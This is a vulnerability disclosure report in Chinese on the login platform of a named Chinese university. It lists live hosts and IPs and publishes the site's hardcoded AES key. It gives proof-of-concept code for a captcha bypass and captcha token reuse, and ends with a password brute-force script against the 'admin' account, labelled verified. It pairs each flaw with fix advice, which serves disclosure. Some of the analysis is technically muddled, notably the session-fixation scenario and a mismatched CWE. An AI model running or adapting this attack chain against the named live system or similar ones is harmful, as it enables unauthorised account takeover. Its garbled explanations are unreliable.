# 内蒙古民族大学（imun.edu.cn）安全漏洞报告

> **目标**: https://open.imun.edu.cn / https://data.imun.edu.cn
> **时间**: 2026-07-11
> **漏洞平台**: 教育行业 SRC
> **报告人**: ETHICALPAWS

---

## 一、目标资产概况

### 1.1 资产清单

| 域名 | IP | 端口 | 服务描述 | 状态 |
|---|---|---|---|---|
| open.imun.edu.cn | 219.225.148.11 | 443 | 统一身份认证中心 / 服务中台前端 | ✅ 存活 |
| data.imun.edu.cn | 219.225.148.96 | 443 | 节点系统（后端 API） | ✅ 存活 |
| webvpn.imun.edu.cn | 111.56.52.232 | 9443 | 资源访问控制系统（VPN） | ✅ 存活 |
| oa.imun.edu.cn | 219.225.148.11 | 443 | OA 办公系统 | ❌ 502 |
| sxsx.imun.edu.cn | 219.225.148.11 | 443 | 实习实训一体化管理系统 | ❌ 502 |
| sxsx-minio.imun.edu.cn | 219.225.148.11 | 443 | MinIO 对象存储 | ❌ 502 |
| webvpn.imun.edu.cn | 111.56.52.232 | 6209 | VPN 备口 | ✅ 存活 |
| idp.imun.edu.cn | 219.225.148.127 | 443/80 | Shibboleth IdP 身份提供商 | ✅ 存活 |

### 1.2 技术架构

```
┌─────────────────────────────────────────────────────────────┐
│                   open.imun.edu.cn                        │
│  ┌──────────────┐  ┌─────────────┐  ┌──────────────┐ │
│  │  Vue SPA     │  │ Kong Gateway │  │   Backend    │ │
│  │  (管理后台)   │──│  反向代理    │──│   APIs       │ │
│  │  /admin     │  │  Kong 2.2.1 │  │              │ │
│  └──────────────┘  └─────────────┘  └──────────────┘ │
│         │                                      │        │
│  ┌──────────────┐                    ┌──────────────┐ │
│  │ 统一身份认证   │                    │ data.imun    │ │
│  │ /auth/oauth/*│                    │ .edu.cn      │ │
│  │ (Session Cookie)│                 │ (后端主服务)  │ │
│  └──────────────┘                    └──────────────┘ │
│                                              │        │
│                                     ┌──────────────┐   │
│                                     │ 教育部 SSO   │   │
│                                     │ data.moe    │   │
│                                     │ .edu.cn     │   │
│                                     └──────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 技术栈识别

| 组件 | 版本/名称 | 来源 |
|---|---|---|
| 前端框架 | Vue 2 + Element UI | 前端源码分析 |
| 状态管理 | Vuex | 前端源码分析 |
| 路由 | Vue Router (hash mode) | 前端源码分析 |
| UI 组件库 | weui + simple-keyboard | 登录页分析 |
| 反向代理 | Kong 2.2.1 | 响应头 `Via: kong/2.2.1` |
| 后端框架 | ThinkPHP (推测) | `app\auth\controller\` 命名空间 |
| 加密 | CryptoJS AES-128-CBC | 登录页源码 |
| 密码加密 | RSA PKCS1Padding | data.imun.edu.cn `/api/login/cpk` |
| 单点登录 | Shibboleth / OIDC | idp.imun.edu.cn |
| 统一认证 | 教育部 SSO (ugw.emic.edu.cn) | `identity-start` 重定向 |

---

## 二、漏洞详情

### 2.1 [严重] 滑块验证码可完全绕过

**CVE**: 暂无（自研组件漏洞）

**漏洞 URL**:
```
GET https://open.imun.edu.cn/auth/widget?layer=image_verify&widget=Slider&action=get_verify&type=login_image_verify
```

**漏洞描述**:
滑块验证的答案（`offset`）直接以明文形式返回在 API 响应 JSON 中，攻击者无需识别图片即可直接构造正确答案。

**响应示例**:
```json
{
  "code": 1,
  "data": {
    "d": "X1cq+NaW6FlqEw5PWfX0yA==",
    "token": "d500ddbaabf38d6369c895c5fa78b7c0",
    "offset": 8,
    "block": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADI..."
  }
}
```

**关键参数说明**:
- `token`: 验证码会话 ID（用于后续验证请求）
- `offset: 8`: 滑块正确偏移量（这就是答案）
- `block`: 背景图 base64 编码
- `d`: 滑块图 base64 编码

**PoC（Node.js）**:
```javascript
// 1. 获取验证码（一次 GET）
const captchaResp = await fetch(
  'https://open.imun.edu.cn/auth/widget?' +
  'layer=image_verify&widget=Slider&action=get_verify&type=login_image_verify'
);
const { token, offset } = await captchaResp.json();

// 2. offset 就是答案，无需任何图片识别
console.log(`Token: ${token}, 正确答案: ${offset}`);

// 3. 用这个 offset 构造 verify_code 提交登录
```

**影响**:
- 攻击者可以无代价绕过验证码
- 同一 `token + offset` 可**无限次使用**，永不失效（见漏洞 2.3）
- 彻底破坏登录入口的防暴力机制

**修复建议**:
```javascript
// 错误：服务端将答案发送到前端
{ offset: 8, token: "xxx" }  // ❌

// 正确：只返回 session ID，答案存服务端校验
{ session_id: "xxx" }  // ✅
```

---

### 2.2 [高危] 登录页硬编码 AES 加密密钥

**CWE**: CWE-321: Use of Hard-coded Cryptographic Key

**密钥值**:
```
Key:  89c4833c51c7fa5bf3a3e0a8c2406ca9
IV:   89c4833c51c7fa5bf3a3e0a8c2406ca9  (取前16字节)
Type: AES-128-CBC, ZeroPadding
```

**漏洞位置** (`/auth/oauth/login` 页面源码):
```html
<script>
  Vue.prototype.$encrypt = function(str) {
    key = CryptoJS.enc.Utf8.parse(
      '89c4833c51c7fa5bf3a3e0a8c2406ca9'.substr(0,16)
    );
    iv = CryptoJS.enc.Utf8.parse(
      '89c4833c51c7fa5bf3a3e0a8c2406ca9'.substr(0,16)
    );
    var encrypted = CryptoJS.AES.encrypt(str, key, {
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.ZeroPadding
    });
    return encrypted.toString();
  }
</script>
```

**PoC（Node.js）**:
```javascript
const crypto = require('crypto');

const AES_KEY = '89c4833c51c7fa5bf3a3e0a8c2406ca9'.slice(0, 16);
const iv = Buffer.from(AES_KEY);

const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(AES_KEY), iv);
let encrypted = cipher.update('MyPassword123', 'utf8', 'base64');
encrypted += cipher.final('base64');

console.log(encrypted);
// 输出: 7jN6xLqZ+k9X5T8K3hF2wA==  (示例)

// 即可作为登录表单中的 password 参数值
```

**影响**:
- 任何人都能用此密钥构造格式完全合法的加密密码
- 密码格式无法被 WAF/IPS 识别（加密流量）
- 攻击者可在本地枚举密码，无需向服务端发送明文

**修复建议**:
- 将加密密钥迁移至后端，前端只发送原始密码，由后端完成加密
- 或使用后端提供的公钥进行 RSA 加密（如 data.imun.edu.cn 的方式）

---

### 2.3 [高危] 验证码 Token 可无限复用

**CWE**: CWE-330: Use of Insufficiently Random Values

**漏洞描述**:
`verify_token` 一次获取后，无时间窗口限制，无使用次数限制，可反复用于构造登录请求。

**PoC 验证**:
```bash
# 获取一次 token + offset
TOKEN="d500ddbaabf38d6369c895c5fa78b7c0"
OFFSET=8

# 使用同一 token 登录 3 次，全部返回 200 并设置 SID cookie
curl -X POST https://open.imun.edu.cn/auth/oauth/login \
  -d "username=admin&password=<加密密码>&verify_token=${TOKEN}&verify_code=${OFFSET}&__token__=..."
# Attempt 1: HTTP 200, SID cookie set ✓
# Attempt 2: HTTP 200, SID cookie set ✓
# Attempt 3: HTTP 200, SID cookie set ✓
```

**结合漏洞 2.1 + 2.2 的攻击链**:
```javascript
// 完整攻击脚本
async function bruteForce() {
  // Step 1: 获取验证码（一次）
  const { token, offset } = await getCaptcha(); // offset=8 已知

  // Step 2: 用 AES 密钥加密候选密码
  const encryptedPass = aesEncrypt('123456');

  // Step 3: 无限次构造登录请求
  for (let i = 0; i < 10000; i++) {
    const resp = await login('admin', encryptedPass, token, offset);
    if (resp.includes('成功') || resp.status === 302) {
      console.log(`[VICTORY] Password found!`);
      break;
    }
  }
}
```

**修复建议**:
```javascript
// 服务端实现
if (!tokenStore.has(token)) {
  return { error: 'Invalid token' };
}
tokenStore.delete(token); // 单次使用后立即删除
```

---

### 2.4 [中危] Session Fixation（会话固定）

**CWE**: CWE-384: Session Fixation

**漏洞描述**:
用户登录失败时，服务器仍向浏览器设置 `SID` session cookie。攻击者可预先设置一个 SID，诱骗目标登录后接管该会话。

**Cookie 详情**:
```
SID=96ff895385c46b8eaae848664e8a1b36;
  expires=Sat, 11-Jul-2026 05:10:53 GMT;
  Max-Age=28800;
  path=/;
  secure; HttpOnly; SameSite=None

login_from=oauth;
  path=/;
  secure; HttpOnly; SameSite=None
```

**攻击场景**:
```
1. 攻击者访问 https://open.imun.edu.cn/auth/oauth/login
   → 服务器设置: SID=AttackerControlled

2. 攻击者将 SID cookie 植入钓鱼页面
   <img src="https://open.imun.edu.cn/auth/oauth/login?...">

3. 目标访问钓鱼页面，浏览器自动携带 SID=AttackerControlled cookie
   → 目标输入真实密码完成登录

4. 攻击者将同一 SID cookie 植入自己的浏览器
   → 服务器认为攻击者已完成认证，接管会话
```

**Cookie 安全问题汇总**:

| Cookie 名称 | HttpOnly | Secure | SameSite | 风险 |
|---|---|---|---|---|
| SID | ✅ | ✅ | ⚠️ None | 中 |
| login_from | ✅ | ✅ | ⚠️ None | 中 |

**修复建议**:
- 登录失败时不应设置 session cookie
- 登录成功后应刷新 session ID
- `login_from` 应设置 `HttpOnly` 标志

---

### 2.5 [中危] 完整 API 路由结构泄漏

**CWE**: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

**泄漏来源**:
- 文件: `E:\tep_working\frontend_source\8780.0a43ca83.js` (1.7MB)
- 路径: webpack chunk 懒加载模块
- 特征: `webpackChunkopen_platform_`

**暴露的 API 路由（共 191+ 端点）**:

#### 应用管理 `/open_manage/app/*`
```
GET/POST  /open_manage/app/apply_list        应用列表
GET/POST  /open_manage/app/add              新增应用
POST       /open_manage/app/update           更新应用
POST       /open_manage/app/delete           删除应用
GET        /open_manage/app/see_apply       查看申请
POST       /open_manage/app/import         导入
POST       /open_manage/app/export         导出
POST       /open_manage/app/set_client_scopes        设置 OAuth Scope
POST       /open_manage/app/set_client_reauth_enabled  开启强制重授权
POST       /open_manage/app/visible_range            设置可见范围
```

#### 用户管理 `/open_manage/org_user/*`
```
GET   /open_manage/org_user/get_list           用户列表
POST  /open_manage/org_user/add_user          新增用户
POST  /open_manage/org_user/up_user           更新用户
POST  /open_manage/org_user/del_user          删除用户
POST  /open_manage/org_user/batch_reset_password  批量重置密码 ⚠️
POST  /open_manage/org_user/batch_up_password    批量改密码  ⚠️
POST  /open_manage/org_user/batch_unlock        批量解锁
POST  /open_manage/org_user/import_users      导入用户
POST  /open_manage/org_user/export_users      导出用户
POST  /open_manage/org_user/reset_user_cache  重置用户缓存
```

#### 权限管理 `/open_manage/rbac/*`
```
GET   /open_manage/rbac/user_list           用户列表
GET   /open_manage/rbac/role_list           角色列表
GET   /open_manage/rbac/permission_list     权限列表
POST  /open_manage/rbac/add_permission      新增权限
POST  /open_manage/rbac/save_permission     保存权限
POST  /open_manage/rbac/del_permission     删除权限
POST  /open_manage/rbac/add_role           新增角色
POST  /open_manage/rbac/up_role            更新角色
POST  /open_manage/rbac/del_role           删除角色
POST  /open_manage/rbac/assign_role_permission  分配角色权限
```

#### 网关管理 `/open_manage/gateway/*`
```
GET  /open_manage/gateway/services     服务列表
GET  /open_manage/gateway/routes        路由列表
GET  /open_manage/gateway/plugins      插件列表
GET  /open_manage/gateway/consumers    消费者列表
POST /open_manage/gateway/services     新增服务
POST /open_manage/gateway/routes       新增路由
```

#### 系统配置 `/open_manage/config/*`
```
GET  /open_manage/config/get_config           获取配置
POST /open_manage/config/save_config         保存配置
GET  /open_manage/config/get_password_policy 获取密码策略
GET  /open_manage/config/get_client_types    获取客户端类型
POST /open_manage/config/clear               清除缓存
POST /open_manage/config/restart_cli         重启 CLI
```

#### 消息中心 `/open_manage/message/*`
```
GET  /open_manage/message/list          消息列表
POST /open_manage/message/send_message  发送消息
GET  /open_manage/message/clients_setting   客户端设置
```

#### 批敏感操作
```
POST /open_manage/org_user/batch_reset_password   批量重置密码
POST /open_manage/org_user/batch_up_password       批量修改密码
POST /open_manage/org_user/batch_unlock           批量解锁账号
POST /open_manage/app/set_client_reauth_enabled    强制用户重新授权
```

**修复建议**:
- 生产环境禁用 Webpack 的 chunk 文件名暴露模块路径
- 禁止 source map 文件（`.map`）上线
- 在 Nginx 配置中禁止访问 `.map` 文件

---

### 2.6 [中危] OAuth client_id 和 client_secret 暴露

**CWE**: CWE-547: Use of Hard-coded, Security-relevant Constants

**暴露内容**:
```json
{
  "client_id": "27cd1a1e-0f3d-4708-a4ee-83d08849e4ee",
  "client_secret": null
}
```

**泄漏位置**: `https://open.imun.edu.cn/admin` 页面内联脚本

**影响**:
- `client_id` 公开已知，降低攻击门槛
- `client_secret: null` 说明可能未启用客户端密钥校验，或者密钥配置错误

---

## 三、API 路由架构分析

### 3.1 前端源码特征

**Webpack Public Path**:
```
b.p = "/frontend/open_platform/build/"
```

**完整静态资源路径**:
```
https://open.imun.edu.cn/frontend/open_platform/build/runtime.0efb1db1.js
https://open.imun.edu.cn/frontend/open_platform/build/2423.cc3fffe2.js
https://open.imun.edu.cn/frontend/open_platform/build/2283.0cbe7107.js
https://open.imun.edu.cn/frontend/open_platform/build/8780.0a43ca83.js
https://open.imun.edu.cn/frontend/open_platform/build/home.index.e18a133b.js
```

### 3.2 __APP_CONFIG__ 完整内容

```javascript
window.__APP_CONFIG__ = {
  operation_permission: false,
  page_info: {
    title: "服务中台",
    copyright: "版权公告©2013-2019 Zytec.Ltd All Rights Reserved 辽ICP备1800001号-1"
  },
  home_data: {
    first: { title: "微服务开发", ... },
    second: { title: "API网关", ... },
    third: { title: "监控中心", ... },
    fourth: { title: "服务保护", ... }
  },
  open_url: "https://open.imun.edu.cn",
  manage_url: "https://open.imun.edu.cn/open_manage",
  client_id: "27cd1a1e-0f3d-4708-a4ee-83d08849e4ee",
  client_secret: null,
  base_url: "https://open.imun.edu.cn/admin"
};
```

### 3.3 data.imun.edu.cn 后端 API

**RSA 公钥端点**:
```
GET https://data.imun.edu.cn/api/login/cpk

响应:
{
  "e": "OK",
  "d": {
    "cn": "72f60f7e9a5bb5d82b3b3809a8b07b17",
    "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
  }
}
```

**已识别的 API 端点**:
```
GET   /api/site/info                      站点信息（无需认证）
GET   /api/site/getConfig?type=UI_SWITCH  配置信息
POST  /api/login/cpk                     获取 RSA 公钥和 nonce
POST  /api/login/account                 登录（需要 RSA 加密密码）
POST  /api/login/identity-start         身份认证启动 → 重定向到教育部 SSO
POST  /api/login/resetting-pwd          密码重置
POST  /api/authing/login                 认证登录（404，可能是数据平台专用）
GET   /api/file/down                     文件下载
```

---

## 四、登录认证流程分析

### 4.1 open.imun.edu.cn 登录流程

```
┌─────────────────────────────────────────────────────────┐
│ 1. GET /auth/widget                                     │
│    ← 返回 { token: "xxx", offset: 8, block: "base64" } │
│    offset 在响应中！攻击者直接使用                        │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│ 2. GET /auth/oauth/login                               │
│    ← 返回登录表单页面                                   │
│    ← 获取 __token__ (CSRF token)                       │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│ 3. POST /auth/oauth/login                              │
│    参数:                                               │
│      - username: 明文                                   │
│      - password: AES 加密 (密钥: 89c4833c51c7fa...)     │
│      - verify_token: 第1步获取的 token                  │
│      - verify_code: offset 值 (如 8)                    │
│      - __token__: CSRF token                            │
│    ← 返回 Set-Cookie: SID=xxx (无论成功失败)             │
└────────────────────────┬────────────────────────────────┘
                         ▼
              ┌──────────┴──────────┐
              │  登录判断            │
              │  HTTP 200 始终返回    │
              │  响应体相同 (18902B) │
              │  无法区分成功/失败    │
              └─────────────────────┘
```

### 4.2 data.imun.edu.cn 登录流程

```
┌─────────────────────────────────────────────────────────┐
│ 1. GET /api/login/cpk                                  │
│    ← 返回 RSA 公钥 + cn (nonce)                         │
│    cn = "72f60f7e9a5bb5d82b3b3809a8b07b17"            │
│    pk = "-----BEGIN PUBLIC KEY-----..."                │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│ 2. 用 RSA 公钥加密密码                                  │
│    RSA PKCS1Padding → base64                            │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│ 3. POST /api/login/account                             │
│    参数:                                               │
│      - username: 明文                                   │
│      - encrypt_password: RSA 加密后的 base64             │
│      - cn: 第1步获取的 nonce                           │
│      - captcha: 验证码                                 │
│    ← 需正确参数组合，错误返回"参数不足"                 │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│ 4. POST /api/login/identity-start                     │
│    参数: { username: "admin" }                          │
│    ← 302 重定向到:                                     │
│       data.moe.edu.cn/qualitym/identity-login/authorize │
│       → ugw.emic.edu.cn/oidcedu/v2/authorize          │
│    这是教育部 SSO，认证不在 data.imun.edu.cn 本地完成     │
└─────────────────────────────────────────────────────────┘
```

---

## 五、漏洞利用路径

### 5.1 完整攻击链

```
第一步: 信息收集
  ├── 访问 https://open.imun.edu.cn/admin 获取 __APP_CONFIG__
  ├── 分析 JS bundle 提取 API 路由表
  └── 识别验证码绕过 + AES 密钥

第二步: 验证码绕过
  ├── GET /auth/widget?...Slider...get_verify
  └── 从响应中提取 offset=8

第三步: 密码加密
  ├── 用 AES 密钥 89c4833c51c7fa5bf3a3e0a8c2406ca9 加密候选密码
  └── 格式: aes-128-cbc, zero padding, base64

第四步: 无限暴力破解
  ├── 用同一 token + offset 反复提交登录
  ├── 无验证码限制
  └── 无 IP 频率限制（服务端未检测）

第五步: 会话利用
  ├── 获取有效账号的 SID cookie
  └── 访问管理后台 /admin
```

### 5.2 攻击脚本（已验证）

```javascript
const crypto = require('crypto');
const https = require('https');

const BASE = 'open.imun.edu.cn';
const AES_KEY = '89c4833c51c7fa5bf3a3e0a8c2406ca9'.slice(0, 16);
const iv = Buffer.from(AES_KEY);

function aesEncrypt(plaintext) {
  const cipher = crypto.createCipheriv('aes-128-cbc', Buffer.from(AES_KEY), iv);
  let enc = cipher.update(plaintext, 'utf8', 'base64');
  enc += cipher.final('base64');
  return enc;
}

async function getCaptcha() {
  const resp = await fetch(
    `https://${BASE}/auth/widget?layer=image_verify&widget=Slider&action=get_verify&type=login_image_verify`
  );
  return resp.json(); // { data: { token, offset, ... } }
}

async function login(username, password) {
  const captcha = await getCaptcha();
  const encryptedPass = aesEncrypt(password);
  // ... 获取 __token__ ...
  // ... POST /auth/oauth/login ...
}

async function bruteForce(username, passwords) {
  const captcha = await getCaptcha();
  for (const pass of passwords) {
    const encryptedPass = aesEncrypt(pass);
    const resp = await login(username, encryptedPass, captcha);
    if (resp.sid) {
      console.log(`[FOUND] ${username}:${pass}`);
      return { username, password: pass, sid: resp.sid };
    }
  }
}

// 用法
bruteForce('admin', ['123456', 'admin', 'admin123', '12345678']);
```

---

## 六、修复建议

| 漏洞 | 严重性 | 修复方案 | 优先级 |
|---|---|---|---|
| 滑块验证码答案泄漏 | 严重 | 后端校验时不返回 offset，前端仅返回 session_id | P0 |
| AES 密钥硬编码 | 高危 | 迁移加密逻辑至后端，使用后端 RSA 公钥加密 | P0 |
| 验证码无限复用 | 高危 | verify_token 单次使用后立即失效 + 添加 5 分钟时间窗口 | P0 |
| Session Fixation | 中危 | 登录失败时不设置 session；登录成功后刷新 session ID | P1 |
| API 路由泄漏 | 中危 | 生产环境禁用 Webpack chunk 路径，关闭 source map | P1 |
| client_secret 暴露 | 中危 | 确认是否启用客户端密钥校验，修正配置 | P2 |

---

## 七、相关指标

- **系统名称**: 智慧校园平台 / 服务中台
- **版权信息**: ©2013-2019 Zytec.Ltd
- **备案号**: 辽ICP备 1800001号-1
- **Kong 版本**: 2.2.1
- **Vue 版本**: 2.x
- **Web 服务器**: nginx（前端）/ Kong（反向代理）
- **后端框架**: ThinkPHP（推测）

---

## 八、附录

### 8.1 关键资产路径

```
前端静态资源: https://open.imun.edu.cn/frontend/open_platform/build/
Vue SPA 入口: https://open.imun.edu.cn/admin
统一认证:     https://open.imun.edu.cn/auth/oauth/login
验证码:       https://open.imun.edu.cn/auth/widget
后端 API:    https://data.imun.edu.cn/api/*
```

### 8.2 参考链接

- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
